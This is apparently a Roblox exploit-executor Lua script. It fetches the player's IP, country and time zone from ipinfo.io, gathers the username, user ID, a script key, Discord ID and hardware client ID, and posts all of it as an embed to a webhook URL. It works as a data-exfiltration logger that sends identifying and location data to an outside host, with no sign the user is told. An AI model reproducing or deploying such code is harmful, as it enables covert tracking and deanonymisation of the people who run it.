local url = wephook[1]
local Infomation = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local placeId = game.PlaceId
local NameGames = Infomation.Name
local IPinfo = game:HttpGet("https://ipinfo.io/json")
local dataip = game:GetService("HttpService"):JSONDecode(IPinfo)
local IP = dataip["ip"]
local Country = dataip["country"]
local TimeZone = dataip["timezone"]
local Text_Key = getgenv().Key
local Text_Id = getgenv().DiscordId

local data = {
    ["content"] = "",
    ["embeds"] = {
        {
            ["type"] = "rich",
            ["title"] = "",
            ["color"] = tonumber(0x78da),
            ["fields"] = {
                {
                    ["name"] = "Map",
                    ["value"] = "```yml\n".. NameGames .."\n```"
                },
                {
                    ["name"] = "U-NAME",
                    ["value"] = "```yml\n".. game.Players.LocalPlayer.Name .."\n```"
                },
                {
                    ["name"] = "UID ",
                    ["value"] = "```yml\n".. game.Players.LocalPlayer.UserId .."\n```"
                },
                {
                    ["name"] = "Country ",
                    ["value"] = "```yml\n".. Country .."\n```"
                },
                {
                    ["name"] = "TimeZone",
                    ["value"] = "```yml\n".. TimeZone .."\n```"
                },
                {
                    ["name"] = "Key",
                    ["value"] = "```yml\n".. Text_Key .."\n```"
                },
                {
                    ["name"] = "Discord Id",
                    ["value"] = "```yml\n".. Text_Id .."\n```"
                },
                {
                    ["name"] = "HWID",
                    ["value"] = "```yml\n".. game:GetService("RbxAnalyticsService"):GetClientId() .."\n```"
                },
            }
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data) 
local headers = {
    ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
request({Url = url, Body = newdata, Method = "POST", Headers = headers})
